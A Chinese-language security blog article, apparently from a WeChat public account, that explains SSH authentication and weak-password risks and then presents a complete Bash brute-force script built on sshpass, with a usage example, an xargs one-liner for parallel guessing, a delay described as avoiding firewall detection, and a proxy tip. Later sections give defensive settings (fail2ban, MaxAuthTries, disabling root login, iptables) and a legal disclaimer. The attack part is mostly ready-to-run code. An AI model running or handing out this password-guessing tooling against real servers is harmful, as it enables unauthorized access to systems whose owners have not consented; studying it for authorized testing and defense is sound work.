---
title: Linux SSH密码爆破脚本，从原理到实践
url: https://mp.weixin.qq.com/s/HT05-3l6jtoKe48_J8B3Ug
source: Doonsec's feed
date: 2026-03-31
fetch_date: 2026-04-01T04:42:09.339590
---

# Linux SSH密码爆破脚本，从原理到实践

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ia7TorzX5Pa3TAjxPibpDDQDIn6rOaicNM9WA2ons7Z526yGnmxfWW3RorSC7Wk22icQFhbrD1N8tafWCibJWJKbfITJ2B4Lguj4l0qSSZC46dFk/0?wx_fmt=jpeg)

# Linux SSH密码爆破脚本，从原理到实践

原创

钟智强
钟智强

哪吒网络安全

![]()

在小说阅读器中沉浸阅读

## 一、引言

SSH（Secure  Shell）是Linux/Unix系统中最为常用的远程管理协议，它通过加密方式保障了网络通信的安全性。然而，弱密码依然是SSH服务面临的主要威胁之一。本文将带你深入理解SSH的工作原理，分析常见的安全漏洞，并通过一个简单的Bash脚本演示如何利用`sshpass`进行密码字典测试，帮助安全人员评估SSH服务的安全性。

## 二、SSH工作原理

### 2.1 SSH协议组成

SSH协议主要包含三个层次：

* **传输层协议：提供服务器认证、数据机密性和完整性保护**
* **用户认证协议：负责验证客户端用户的身份**
* **连接协议：将加密隧道复用为多个逻辑通道**

### 2.2 SSH认证方式

SSH支持多种认证方式，最常见的有：

| 认证方式 | 特点 |
| --- | --- |
| 密码认证 | 最简单，但易受暴力破解攻击 |
| 公钥认证 | 安全性高，推荐使用 |
| 键盘交互认证 | 用于一次性密码等场景 |

### 2.3 SSH连接流程

1. 客户端向服务器发起TCP连接（默认端口22）
2. 双方协商加密算法和协议版本
3. 服务器发送公钥给客户端
4. 客户端验证服务器公钥（首次连接需确认指纹）
5. 建立加密通道
6. 进行用户认证（密码或密钥）
7. 认证成功后分配Shell会话

## 三、SSH常见安全漏洞

### 3.1 弱密码漏洞

弱密码是SSH服务最主要的漏洞。常见弱密码包括：

* 默认密码（如`root`、`admin`）
* 简单数字组合（`123456`、`12345678`）
* 常见单词（`password`、`admin`）
* 与用户名相同的密码

### 3.2 配置不当

* 允许root直接登录
* 未限制登录失败次数
* 使用不安全的加密算法
* 未启用公钥认证

### 3.3 版本漏洞

某些旧版本SSH存在已知漏洞，如：

* CVE-2018-15473（用户枚举）
* CVE-2016-6210（密码猜测）

## 四、SSH密码爆破脚本解析

### 4.1 脚本源码

```
#!/bin/bash
user=""ip=""source=""
while getopts "u:h:s:" opt; do    case $opt in        u) user="$OPTARG" ;;        h) ip="$OPTARG" ;;        s) source="$OPTARG" ;;        *) echo "用法: $0 -u 用户名 -h IP地址 -s 密码字典文件" >&2           exit 1 ;;    esacdone
if [ -z "$user" ] || [ -z "$ip" ] || [ -z "$source" ]; then    echo "错误: 缺少必需的参数"    echo "用法: $0 -u 用户名 -h IP地址 -s 密码字典文件"    exit 1fi
if [ ! -f "$source" ]; then    echo "错误: 密码字典文件 '$source' 不存在"    exit 1fi
attempt=0total=$(wc -l < "$source")
echo "目标: $user@$ip"echo "字典: $source ($total 个密码)"echo ""
while IFS= read -r password; do    [ -z "$password" ] && continue    ((attempt++))
    printf "[%d/%d] 测试: %s\n" "$attempt" "$total" "$password"
    if sshpass -p "$password" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$user@$ip" 'exit' 2>/dev/null; then        echo ""        echo "成功! 用户名: $user | 密码: $password"        exit 0    fi
    sleep 1done < "$source"
echo "失败: 未找到有效密码"exit 1
```

### 4.2 脚本功能详解

#### 参数解析

* `-u：指定SSH用户名`
* `-h：指定目标IP地址`
* `-s：指定密码字典文件路径`

#### 错误处理

* 检查三个必需参数是否提供
* 检查密码字典文件是否存在

#### 核心爆破逻辑

* 使用`wc -l`统计密码总数
* 逐行读取密码字典，跳过空行
* 每次尝试后延迟1秒，避免触发防火墙防护
* 使用`sshpass`携带密码进行SSH连接
* SSH选项：

+ `ConnectTimeout=5：连接超时5秒`
+ `StrictHostKeyChecking=no：跳过主机密钥确认`
+ `'exit'：连接成功后立即退出，减少资源占用`

###

### 4.3 工具依赖

脚本依赖`sshpass`工具，它允许在命令行中直接传递密码。安装方法：

```
# Ubuntu/Debiansudo apt install sshpass# CentOS/RHELsudo yum install sshpass
```

## 五、脚本使用示例

### 5.1 准备密码字典

创建一个简单的密码字典文件`passwords.txt`：

```
123456passwordadminroot12345678
```

### 5.2 运行脚本

```
chmod +x ssh_brute_force.sh./ssh_brute_force.sh -u root -h 192.168.1.100 -s passwords.txt
```

### 5.3 预期输出

```
目标: root@192.168.1.100字典: passwords.txt (5 个密码)[1/5] 测试: 123456[2/5] 测试: password[3/5] 测试: admin成功! 用户名: root | 密码: admin
```

## 六、脚本优化建议

### 6.1 多线程加速

使用`xargs`实现并发测试：

```
cat passwords.txt | xargs -P 10 -I {} sshpass -p {} ssh -o ConnectTimeout=5 root@192.168.1.100 'exit' 2>/dev/null && echo "成功: {}"
```

### 6.2 添加日志记录

```
log_file="bruteforce_$(date +%Y%m%d_%H%M%S).log"echo "[$(date)] 开始测试 $user@$ip" >> "$log_file"# 在成功时追加日志echo "[$(date)] 成功: $password" >> "$log_file"
```

### 6.3 支持代理和跳板机

通过`-o ProxyCommand`可以支持代理连接。

## 七、安全防御建议

对于SSH服务管理者，建议采取以下措施防御爆破攻击：

### 7.1 使用强密码或密钥认证

* 密码长度至少12位，包含大小写字母、数字和特殊符号
* 禁用密码认证，仅允许公钥认证

### 7.2 配置fail2ban

安装fail2ban并启用SSH防护：

```
sudo apt install fail2bansudo systemctl enable fail2ban
```

### 7.3 修改默认端口

编辑`/etc/ssh/sshd_config`，将`Port 22`改为其他端口。

### 7.4 限制登录失败次数

在`/etc/ssh/sshd_config`中添加：

```
MaxAuthTries 3MaxSessions 2
```

### 7.5 禁用root登录

```
PermitRootLogin no
```

```

```

### 7.6 使用防火墙限制访问

```
# 仅允许特定IP访问SSHiptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPTiptables -A INPUT -p tcp --dport 22 -j DROP
```

## 八、伦理与法律责任

### 8.1 使用原则

* **授权测试：仅对拥有明确授权的系统进行测试**
* **教育目的：用于学习和研究，不得用于非法攻击**
* **报告漏洞：发现漏洞后应负责任地报告**

### 8.2 法律风险

未经授权的SSH爆破行为可能违反《网络安全法》等相关法律法规，最高可追究刑事责任。请务必遵守法律规定。

## 九、总结

本文从SSH协议原理出发，介绍了常见的安全漏洞，并提供了一个实用的SSH密码爆破脚本。通过该脚本，安全人员可以快速评估SSH服务的弱密码风险。同时，我们也强调了安全防御的重要性和合法合规的使用原则。

网络安全是一场持续的攻防博弈，只有理解攻击手法，才能更好地进行防御。希望本文能帮助读者提升安全意识，共同构建更安全的网络环境。

---

*本文内容仅供技术交流，请勿用于非法用途。*

*#哪吒网络安全 #bash #ssh #bruteforce*

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/9Xx8EkicjWicEcd3af9D02mtgshZPKdXndvibwGAzfG6JYkbK8kTEkptqlGSicib2OmskYW3OQohNwTqz3RdpV0sIIQ/640?wx_fmt=jpeg&from=appmsg)

---

欢迎加入我们的微信钉钉交流群，一起探讨漏洞研究、渗透测试与开源工具！

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ia7TorzX5Pa2txHr3eLicyjGuDTqicbtQYHhzftQR6r4AzH5zvFH6Aq2VGSI7btmyr9BgumWAFiaZibRsZQqchiaDcIfVgvqzntxzMn29JmYw0z8M/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ia7TorzX5Pa1bG7BhBC2klWIZt256icIja7cvRlqwxesRcthm6rLEpibUOR45XQ5JKG7V0VEB5DdQmyAKjDc2baPqbfgrowA9uSGkW0aAOUhog/640?wx_fmt=jpeg&from=appmsg)

*![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ia7TorzX5Pa3wiaMVOnLYkdxWaAr52e31FGptUV9YuiarN8KRE65LKicwAWLNrY6N0VNLNhwwCxVCH3HkqYZ9PIX6JiafxBbvlg30icA4HrhrSQu0/640?wx_fmt=jpeg&from=appmsg)*

###

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/9Xx8EkicjWicHbRAicRaapa3GviabJibYVw9zs9WR9VqEMvuLm45IegNOPBFbXjj3d6V6wI4DMVlgObM9nFOOeU6j2w/0?wx_fmt=png)

哪吒网络安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/9Xx8EkicjWicHbRAicRaapa3GviabJibYVw9zs9WR9VqEMvuLm45IegNOPBFbXjj3d6V6wI4DMVlgObM9nFOOeU6j2w/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过